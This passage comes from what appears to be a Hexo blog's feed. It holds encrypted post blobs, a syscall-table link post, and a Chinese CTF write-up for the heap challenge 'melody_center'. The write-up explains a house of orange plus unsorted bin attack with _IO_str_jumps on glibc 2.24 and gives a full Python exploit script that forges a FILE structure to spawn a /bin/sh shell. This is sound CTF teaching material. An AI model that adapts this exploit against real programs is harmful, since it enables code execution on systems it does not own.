9e4406a0d2630fe48467449d02200b325c178899ea1b32fe555574e032e55ba38204ab2bb5df456992f2200b0e0a22a2cc8e4bf16c0adcb28f135d51644b776e8d09ce1fb9960fcf33ce06ee4d5967becb56d2223229801afcaf6b3437132c8f14fba76349d7cf0bc63b8e36eddc7dab7d83dd18c7a2dc9eb6a6649ea08679c9ce520c57c537b130bc25a18c974de1f3fb2dd566815ff92d27ff2b6a1671e0fd840c73247d55d47d2f25ebbaaaa6d7f1c5da511f67878b04d86d7805fe495cbed8fbb71d2c8265877d399a8fbbe2113d75b562e49d664bf57ef27917bb299fbf7569ce21bd580dc0bce20f2559f1af668c04f10dc5729983a75da4dd0c385d5dc4429c6d654f195645bc8d99202fae2fed6ddf4ad8052d9c995df36e14007689508a3e35e77cacae7c12664f30561a9e73eeae5ff1bbb8d9a54b5e2008a7b8420cffca1c9c1b45b32b761a3ca7d7a47ca482a38638d41b85037abb397ea233374bce30c690a2eae0e952b162a8acab47a2b830e95fe975fad59b95ec23a3b200e008c24d9e1206d0864cf3696cc57c653147aecf7db50a54edf9d163ec59c507e6f55e3ae22daca106be24f504dc96f5b7f38a233f1e1adfa947f1270b89df855ad56218631314e608977f5efa07def14539dd7642383b2e7f8cba27d6ef9447376fda01f63b816d63187ed2c1cd4d1c7cae66d254db3f6cb4df2b4944293df4cded3f913fea51a5aa7da5f7c70904b0b1af520e6233bd94d5a08611a8819304bfa699359bed284cef735a14d20ae2422af88e0920056268420c94f4f9667d8f270acbf55af5b01a5b1d70d80724184ee31d6573567d3fc58beb3824c1d3a57a4f1b26f91f9c090754741eb3b322502ca81994ab9dba7dbe23329013c555a361274564c3911932dd96fc37f3c7e5a6fe8a32b591ddf2c02bf4582158854a5dd1784566a089a0a20bb73e237b4d2473b0551d5dd9bcb86f430ca889a9f5493b2808b0c9a5e2d38e65a035ee91e87e4d547236399ea919247eeef9f0439781ee927818165abfc6c135b5c357787065f334020bdbd90c050c8974024f276ff8beae57a2eb2078a9b929aba34032507d076f1edf76c4edd83782cc09afbdd743d3d38216ac0837085f560520d0ae0e4f1d160f049b11beab7f59ca7b195b6c41ecaf9af86595fdca14d596ff66545fbb78e819d27a61744803faf8633c7364fd05cbe1ec44bcaa004be907b7223002da8c16500c1a3f95bd5807923f086e7b47b6f7997240f2964f27424a29fac7bdc2e2cd8025274b9f1ded8a8092e779c97feb94faa9f7c0e20b863b21d598f525240ec4a061b7a63ae4579a1c861f8c9e3f8dd8d92e30e025a78ef5bc9d0487de15a0cdafa3f55034b977fa929a8b7faacfef5365fb287cae957c18a01941a8e9b01352ab4350fdf3af9abc5dc5899207c2ac06770f3bb8bbbef92f31e413aa85cd948fc38eabd5afc479dee5b89120052f04dcc760febe5457db1edb4283132706d9e9b9afab9b2b7ae18b6a27fb2cf21dc0180aad200e2cf8e7c96c12c9a56491882d7e3fc82656f505de7a782c99fc6a795000d8fcd13f3f557cc915d583ec4e2a2ba3dc7f021df2656d9503cf0f857a19d041200f28d5c3a2e4d6689932afac5f486ceb54173f9d861c59d2bc90988e182348bebbb8dedec90eaffdb601bfbe62bc57ae7b961f5468bee4d758009a5b384b8bbe943d7420cb5a6db67894e8690a244324f5f3b0a01295ff323ae9b11351b0f404ff2f74fc3eb10372dc03a9149143f0a6eae302447f839c7cbe3768ab86895ac565e3ff6229be5cd3980f5a253d8ef24c04916f32b03716cb088f31d295cbbbf68ca041766669a8c6dfcb92834f5f0a2e6f03d1d355aef376965aecb95504e3ff9cce804443d92e6a06f08fa94f4b48b38489b02a2ba3aede5d909513a6a1fc3420746d914f44d59fea145d3c869f0ac939ef501b63f4313945bde6c90b2fc318b11d564a0d217d6374268cc11a2e948e6377c5decbf0d7a48b5f9ff543c874c1c399afebaeb2ff536f4cf41077a467cf728bc81c3e8c58eabed99ba54b60ce1de7fad0c1299714a5affdd5527c6735e14b30be1fa6bc5fa1750d5baff1785b233615e3f89ad3eb7255ac0e4d8a93a29cca3f91511c1bfbf219c6ceefb4d61ee96ce47cb55da0de9967c99d74cc1ebed7324140764fb85aa1f294754048473380f9bb93bc74a33e9297512584a4633b48320920f3959ad622dc3fbcb021eba45201e4b4b6b904b7e479480b9f9d85ab4414c1ccc140a5f8c63fc38285b7dbc46f3c58253cbf667862deb3520e7e199d3c2a1dcfbe07badd50571a9b1b3f49591b74a78b2f25c7ff218df2b8a81d83d87e70ad7eb80f36fa951bcc188483687213442c7b7797e9225460bfe4c4cd8f22bacefd9bc82dde0f11bffab3609a2d08f68b46bae5ebff7c1fa8211551867d1026c4ebc7a3329e49c18c12f2f6b46ffd44e78ab1c9f7367a164865f2bd053f25f4199749b9a54ebc72d0fe154c59d59d36030f6fffb07841d2227fea692e38cb322ad4d40b282a6558bf996d01a3b18cee5e27bad74765edbe39a1798c231dd06f3bb38cbbc03c41f0829d7ce3922e00f835336a66593f0c44ad5fb562ab9be06860af17b2fb744b1054a87ab31c866b16517758d33814e8a62166aa61b4e6f5734465dcde45e01289dfec24010d161877b1b592787d5ab240019d6f4ac94be2ee0d39480c9375abaf29e7dadfe83145ddcd72ea8c53fb14d166757eb6b32ddb77877e582fc0730469656421374ed40d6130a76cc497c902282195b091cd5118e80594ab34780083fa8111e61d5268a0d8f5c3ea541b146f31d72072313d9647f78ee1fbda131e825b3ffd1f19526cafab0703c4b48bd67eb6dd41f532ff91fdce6756d4204181d970fd92be215f799cc7aa7c360ccd7895282b4b57528dc8a7d2d525aba317961314eb8016566685890b028339e041f320594b27a7a72627679f131c9fdac389406955b4d8c861a371fb64e0981474f395c8bb07d7ec954a3654e3d87d03b70f3b60f910450bb358fe76c050caea212907f0ff0b749c7bf4049c4aa6fdddb7dc62e76fd4e88b750bf3d5607d54b026ecfa99da8396c6469e11a2008e7e42c3b94c4ef78e1e481a0c7063498d1902de5d0ac22dea64f7dbcc1d6af18338ae20d3f4ad839352f0298d7430010fc5972cf8b62ca269c2fac9ec4158a90bd4ccd41774a29a4dc63c25ea401b155f8b163dfb246ed63f291f2cd81347f76da7f8de6705ec29c2642a98f4baea523ec00a2ba08b10f98523e7bd903b4df2febe44d1385ac76e6098f0754e9a369710b14b090aeef7fe72f20c12009218a5d3280f702f53443082c8b2d449112e068924adb6a249e4aa98475fba603c825dc327840e82a2881410b96f79927915d2805bea573f91d4f02812ee65589ebd0fbfea52fef383ea7f6faac02498568b2522b1813e0516ef8a5d261342bf3e7d2d69f35c4df8bb0a3c711160d37eb83f994f871b7c0e0d9711e9baf8a9c588c92cf6de176ce9b7b6f7ba50fd607986d9d9625654a95b8dfb8e5165ab92b41b6dec91d253491ebcb35c626d09cd976a85b6143a9a098dbf3d6947ec090a138f2682e5277f53389be8896a660083ace26cc4affcae27f2e3e067fe395ce800740a6ef62167722341c259f988d28b4659240f8a3b0e300d32652bba2984840d148ac5762c4853a43490945f21f1f4446a3d570498b22c7ac6138a26acc04fbdbcb6786a1d756a517e66e73248f60079854a1bc1cb705288512027b7b89c0eea21c0000f6c5a9b91720ec1ef9ad1f32d9aa334017c81bb5ad8bfbc96a4f84ac48eea0514296d279a1ac16b54593c3b514d6148d18a9580754d77675828631682b7a682a2a0bf12ec095f0f86ecbfd1bcc9a98e46433c5aa95bba37803fd267fb3dc9b213bd408cc9447c15a2a9eb4f3a14acd6b65ad702a95a28004031e6587d2595548fb53b0ffa9fd7ce59cf125f913831cbf59bd934e611da918b6fc67e3dda55ea36a8ed4d68866005e06286ddc7ba8b7686fe68f213e573fa5a315a683fcf3c45933ed88faffd78f79dd06e201718ba7a2f28d86b28307e78c3a10a13c81f54af20cea4048917d2ebe514061b10fdf7585b2c3cb2dd6a2774711a160bd851d42468320485a4ae70d6b003cebc6253a50b754132d4684768f376a1363aad72bf6ec00f86e1be0e2b1a5dad93dce9ac2031696e1bb553ec68a7eb9717ebf931ea4685ce54b2e7e703b95237efef7908a6818216a4b853d071ed012c011ecff898f2bd184472c080f9b8aa2ee4bd662cbc50893d8ac8c066b87b9a0ba296b231c1d5001ad32c58818d05e1a528bba0f77a192628ad2d5394e06a985c6382298a63484cb7896c9aa90a474b5693b6178214586a7110099d42252f944c8d503da849a85cab6d269db2b00cf2a9589cd943b95aee76440c9e2a7858e0bf53364fd732f5db8b939a52c8ea9c2705d9fe6844ef0275ad6c96be19c409e46d90d845834d1cade349d6d5a628fbc50ba3b2ecaa00dec34ce4a9c7cae5704639012bff2fc96ebfa0779628f879d69cbb84ba749feaabeedd63adc998fd333af7f6ecaae2375ba243dd975f898d32dbde4630fa7ef4d1c632a4cf5af663b190ab561cd3b14e3dfdeb919a167adb89fafa1ed721006ee8e97ef34dfc4936897eada5810411b18365b2a26838f0053fd5bede456a0c78060471c5913f96c2986b6e6cfa72fb09b4a13e6d2a267a04471b853c91c7a339d7915288591f529d4e9ec7b8a74f709640faeb6dfb9cb3a058df9744fe2e454b8135c96ca3af841c5a2863be1c5e516973e7a80d0c7d50e847b8d6f6fcf9c2a41a2341ea79d39d9c7da0e4305fc5fc3406313f84ed7d3e63a123b59f9fe858162d2284ea33e9a37655f9862dcf14dd0da7fa72bc5a4731812ee1d236304f1b19197205122a028d3cda0d3e1cbdb0cba4abae56d9c98f0dd533413acd1549e3f1f284745c1dc0371c1a279cfc273d154f473c24ca8b1ffa73339b6a2ac7597670ff30c05bbbcceb823935eef09866da7f11e7f3c89c264da03eb9cee78ec5ea3bf03491c55f36a5b1e004c59ec7c03291775d816a87b496664e970be6eeac7acaba1c56338519757a3f514e4fe44215cbab19eea21d0c0dded5c76219a7c52a8e0d37b4d43fe39b5fa5f35dc4050849789f7ecf883732dc04228632276e3dbd47b9667af0aa822d9bb8590b45d2b37481ab3ef0a8c9b2a2fa0a060a1ae4bc95e177bb70b45b25a41ef38894b232197a362208370e76240ab842e89af1ecf0235c8a65c8d0b456b00d16ebd87b6a2471976acada4191a1633c90383d4c0e0846fde6ceae53b9a7de56f0efb5b2342f9ac4f7e48950cbb9ce0053c73dd7d407b3594a260f6e0d34d1b70cfa3338e65676f8f0053aba555d5608602c5c36be7895d41de65052c5a9c645d8ea9ddfc452f35a90891f0cc54c977ee7f28a0a20b0d55211929b94773e32f9f81482fb651a95442886c628f5ba05f331532ee4fe363ef4962b67ff83decb934415f1a40a9cdb436b20f064fe2be29bf84e5dcc5db3bc6e856a293f90346f29caa05157cca4284c1d8cf348b70d298affd655dbd8fae5cbbf9192d853b6a6005468ff4e993c973df0ae28a7014b76e7abc0748ff64b7dd996852f927344d86e0581ae10cb106cae80e0c7b77d25a5f522d7ce60e2b67558110d1af07aff0e93d09ce69714723e13bd6f250afcbf6490e287341ab62efaf952529675b5705cf5c762ab259fb755330e64c15a1ef55a946a138cc5c719325738de0e77bba957af2329eb07f68e87175204464cf763602eed0f24fdb52676986e3ea42ae5c4e2dad117ab1adefb7414c31ff330458d22f1cc50c9c8f6ca27a0b65ac5c7644341a0b1e059bd87520b922202246a83bec79c83da4ff380616da450df312a89eb56cecea4a385215159b536afb9679422962f5a017f15cd183362e85974c847e33fb3cebd5b7ac33f1744680d4cc89884cf486e4a91c1a52228a8a7380915d3097704a6346840807701b936e462e80f999232e918b999d36ac124aa9e102982616e5580773f11692a1e5090e04994d991baf36d8da031c9e6138cbfdc5b8581a0e77ca81964415b03d0738973bc09e594ff04e91a1b11f6024a9ee9b56cb4234d70dc8dedd32e985acf6fda136a8693e14abd7e2df0e3cce0bafa7ef66ca982d2fe201259c6dc4f253574000b0a24cf88c5974c02786ae7e7d1be22612bb3d5a15aed758de38af516085f1e742bd957560ddb27c151672cc644671c09c3a203d055bfcee97daf4f98d3c291c960b4e52f79dc1722a9bb8d9fd35c56b7539ab125d95ecf0c2942158c3e5610b3d11705d48f48c55d55d3a77e3cb472d06e25ff8efd76283587f008bb65871f5f5563ef9f478c691fda1a23e8ded6978f1457fa249c26999eef25c678cdc0a60ec21bbc329d0587917569fe8e344c041d0bd0536c380c187c77b9f58d41dc32f3d2cbd41febf630a249451f828445d1103f78ab2dd86a8914195070cf5bf4985e45fc8857a7c9818c40d749e402f5eae3e07b2743a8cd89473133878072168349255fca8ca0680c325867c09c21e6099c2385cdb5636a8410a6006628da375d90ee514d96a2dba32a6ffcadc9e0ba01fc8327faba4e5b9d2d1b85470334e2ae7a72b6ad7d487eb247dddbebcd1ac1ba026125a119c2192a02dc4fc8297b2bd2179b6354ff845ab9976aef28092d43c10b9a1815dd9bcdf8753a2341ed019bb75ddacafd18aec404fc0c94f8c4a65b10683808109f3f3bdc6c8637ec1af9d1ad336831aff0b1b78a6bed6101fd03ea657d7c951f0d46ddc612d9c2f18368140a53e848904c556faba06ff16fca95aace41947ba3bced052a77089a51ffb813624d659558be1115ee7049a9643dc15c3f05787467b0e4be4794d99d9afc35c3c202e510b0055689881e62d2471807cb252b6fb6ca16d7efaf0b0a199edbf833edb3c98b4aa54fb2b7397ca42181d3a47543389493c4937a6be35cdcd3397aac129697dc0a18022722566d5bf99cc93b79b98a6a35401bcb3df75166ed72add259069c4cd4ec34ee0e7c2199a6422d2765aa5f5198b35d7f8cccfdb2409f57501bb285a5a3317b0498839c986ee88d56556051903ae1951035eda0034d3f1705738912498ce8b0ed1b9a1b2c516e5117c659c382255ae7a20145a1353a98692e66aacf3cf6dec9e71085b7d6ab0ad974faeead3f5e247ca670ffce9559cce1b4a2f76c22d203c012b96c2af599defac168640a5e3894d69ba1bf9d157e3bed051029555b68bb3f6794eb2443d29d8f06a12cc0fb0bf8aa63d1357051f6b2b6d96e94622e9d6f0f02ffc5a004a3547547fe81e71e0fcc647a3ec899d95614b4803aa166ad2dce52f4a5e2f01d71505950e029cd0ac0a35692a2cf39c04b55a1cf3135c05fea790e34feb6533d21b4be03fa50cbfb2606c3e010cd8313fd6b1c6a51b1070662dac3273205ce7cca82fc0bef7b4b334e2d7b21bdfb621259ef6e42e9a1aced29fbcfa710ac46d2a9808e8fcf50049df95ada4401c2a167eb3b63e6461149b2deea883f54af95af6a560c4e3ac47b89ac66ff8f85c90e358fb3d79f20317648193752402a0739277db09dbf5ce0c36221fe7f1eb6f166bea03105c72806fbdbb5c136c82a4e53af3398c54177b11376b00cd5e88ddf67a9e28c0e3f5a8873258737dec1d372310a83206f1c35265d1b62bda77eae189718d6d9aa68be1f71a3a1de9afd3187bf73631063ec79e0ebcc6ad43a545a6f5f078f1c1b9910ee89ec836cb2604fea181457910f2ce3ec235f434ccdc04c3f072988f3ab63c2f71079f3e7dccb625fd709a16afe0e74a9c3f68d964efa94ef24b8acdb522c2fd7e46f40c7eda36ceb33f6d8f65335bf4b957e228298d97aae35147fb4ade32f62c9b8ec8df0f253c54119605c65d34b987082cd4603dac786110077dd68e41736863c20b9d68b85b8c3f07ad18b665ca8e9ad817dbef68e4a87fee19abc62fdf286a8ac6f2d58393a8adca1cc4b72c0c0210903281402175fc5686c23a83c49df0cac4ba16912058adc6b08a5c31954847fee1b8b20a8d8f1523cd6966acecfb51c310fbeb83227ff533d96ee46ff1dab2b295a4772b1dbb9a9259b9ee24f3bb8cae570a08500d4ec998d40dab430487f7f1698a039e27e79e81ea92c8529b95fddcb5ed65cbcf2ad42efe1adb285053bbfa205230bb00b6f0e22b0fd3a12708f33b7c0e9f4f987386a717db0bb23b0f9dee342f523b47675db654688b9d8a29273f657e528baf0b89350e327832ab722bbb20cbe537cbb306f58eb519b45edfee1980e72e6f16ae6e441633d33a288a6322e9ae8d4030ac1d0de447b3b7f13982cc9850705bbd814cca1fe0e827e5f1e04d70fcc28dba8e938f501f40fa635eb91acfe77a7934d9f93b4026320c1bc0ea3bc0267bc72ddaf815a474b9f0b08dcd6a1179767e1ea8160d4683e76736179d476f993869b7bd1e094d7e8d75e16a6d5c31cbc6cbd8c7e03bf7aec426e7ae799627b398458f2d34b095c5d6cdda534ce2ca5c3501f4da6dde9dfecb912e009c1db8e95216562675ea7c5921d015b7949baeaa43f277c9162ae41733db97681b5e6825818407156b70c900fb9519238bbde6780147ea69bd0d671e454859cc562aa3ffdf06a2fe67db4423993a30bc8956b91c7d4b72b3e4390c688d3ef295b31e465fc3c7c93ede92a9ea4b43a571e388a7999c49333a81758e2033a3ff64ce8be39f73cf668284670b78c97b0ec53cab0573ada5d4410e7bba97d82b9b469b72bf9a9a22699b8132e3a939019de2f4c157cd846ee6f868d841bda13dbbb23768e9fa0fa172565c0dfead66610651ef94be123ca67152b61c1d8243999238fdfa1b31ea3b5ea855b6fc95e35dd64fce90f48fce99f183569e6e52cd66429f9d62796e4284ce68a80171023d588819f6dd0c0d69c783a3f707f09fac6ab525ba933d46a3a7f86ad595da7600ebe8eeef51a5f7ba6f1bec8372f4b3eede2e06974ef75b126dd9c66af926f47f874da52eb34ffdfbb65d710045000d583570ae3322bc447749cdf26d0abf8082a2d471749ea7156f8468d092d0aca41a64ef7ae2d338daa6fa54c5e837b1b733e49b938d1676055bc6909fa2cfb3a1a53e18301140c45d9dcb47ce22ff5c9ce56418540a156343d36b5be0ef49000c0f513e7ffdf6bb97889eb235c602ff74e1dbe5fe7b17cafb9fdb562dc8a6fc94c2c11cd24817c9e6e384395f9b4cec34f15e836abe1e7037454139c305978c2529df639b66d91b7cdd7e0dfb6c2d5bfe419861f5c4a7cbcbf7030488a92a50140f4d7c5d5b25aa5113125ecf69630c1138521d2cfd922b4184da6b5350e3d8374e8deba9365104dda6fe7b7d3280084a74daf7703cf73febb12d91a38c4924aee7a2e9e894426d6aa541e2fe59cd79aa2d745045ec7feab470aef28396b32e66b7e551e0c8e069c30b59d72cbda402326b706ff78043c1a2c014d8647d90ad1a61b78a33e41f033edabac99218a98774797c4435b16d7bbd67e2b764f8d45d9686b9597f828a5ee0541be6d40217ff103</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux x86 和 x86_64 系统调用表</title>
      <link href="/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>x86</p></blockquote><p><a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls32.paolostivanin.com/</a></p><blockquote><p>x86_64</p></blockquote><p><a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls64.paolostivanin.com/</a><br><br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p>]]></content>
      
      
      <categories>
          
          <category> Reference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: melody_center</title>
      <link href="/2020/02/07/pwn-heap-melody-center/"/>
      <url>/2020/02/07/pwn-heap-melody-center/</url>
      
        <content type="html"><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p><blockquote><p>题目描述 </p></blockquote><p>保护全开，题目给了四个功能：</p><pre><code>1. Create                      2. Edit                        3. Show                        4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p><pre><code>           (chunk_1)+----+----+                    |    |0x31|          +----+----+(chunk_2)                    +----+----+          |    |size|              +-----|    |    |--------&gt; +----+----+              |     +----+----+          |    |    |              |     |    |    |          +----+----+              |     +----+----+          |    |    |              |                          +----+----+              |                          ...........              |                          +----+----+(chunk_3)              |                          |    |0x21|              |                          +----+----+              +------------------------&gt; |    |    |                                         +----+----+</code></pre><p><br>Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br>Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br>Exit就是调用exit(0)（用不上）</p><blockquote><p>利用思路 </p></blockquote><ul><li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p></li><li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p></li><li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p><pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p><pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy){if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]fp-&gt;_IO_buf_base = NULL;_IO_default_finish (fp, 0);}</code></pre></li><li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p></li><li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p><ol><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li><li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li><li><code>fp-&gt;_flags</code>= 0</li><li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li><li><code>fp+0xe8</code> = system_addr</li></ol></li></ul><blockquote><p>exp </p></blockquote><pre><code class="python">def create(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def edit(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def show():    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)    return p.recvuntil(&quot;==========&quot;)def exit():    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)def pack_file(_flags = 0,              _IO_read_ptr = 0,              _IO_read_end = 0,              _IO_read_base = 0,              _IO_write_base = 0,              _IO_write_ptr = 0,              _IO_write_end = 0,              _IO_buf_base = 0,              _IO_buf_end = 0,              _IO_save_base = 0,              _IO_backup_base = 0,              _IO_save_end = 0,              _IO_marker = 0,              _IO_chain = 0,              _fileno = 0,              _lock = 0,              _wide_data = 0,              _mode = 0):    file_struct = p32(_flags) + \                  p32(0) + \                  p64(_IO_read_ptr) + \                  p64(_IO_read_end) + \                  p64(_IO_read_base) + \                  p64(_IO_write_base) + \                  p64(_IO_write_ptr) + \                  p64(_IO_write_end) + \                  p64(_IO_buf_base) + \                  p64(_IO_buf_end) + \                  p64(_IO_save_base) + \                  p64(_IO_backup_base) + \                  p64(_IO_save_end) + \                  p64(_IO_marker) + \                  p64(_IO_chain) + \                  p32(_fileno)    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)    file_struct += p64(_lock)    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)    file_struct += p64(_wide_data)    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)    file_struct += p64(_mode)    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)    return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):    payload = pack_file(_flags = 0,                        _IO_read_ptr = 0x61, #smallbin5file_size                        _IO_read_end = main_arena_addr,                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,                        _IO_write_base = 0,                        _IO_write_ptr = 1,                        _IO_buf_base = binsh_addr,                        _mode = 0,                        )    payload += p64(_IO_str_jumps_addr - 8)    payload += p64(0) # paddding    payload += p64(system_addr)    return payloadmain_arena_offset = 0x3c1b00_IO_list_all_offset = 0x3c2500_IO_str_jumps_offset = 0x3be4c0system_offset = 0x456a0str_bin_sh_offset = 0x18ac40# old top chunk ==&gt; unsorted bincreate(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)# leak main_arena and then leak libccreate(8, &quot;B&quot; * 8, 217, 108)res = show()main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))libc_base = main_arena - 0x58 - main_arena_offset_IO_list_all = libc_base + _IO_list_all_offset_IO_str_jumps = libc_base + _IO_str_jumps_offsetsystem = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offset# use unsorted bin attack to make _IO_list_all = main_arena + 0x58# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin# make use of _IO_str_jumps-&gt;_IO_str_finishpayload = &quot;E&quot; * 0x30 payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)edit(0x300, payload + &quot;\n&quot; , 217, 108)#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)success(&quot;main_arena: &quot; + hex(main_arena))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))success(&quot;system: &quot; + hex(system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><blockquote><p>小结 </p></blockquote><ol><li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li><li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li><li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li></ol><blockquote><p>相关链接 </p></blockquote><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p><ol><li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TEE的一些预备知识</title>
      <link href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 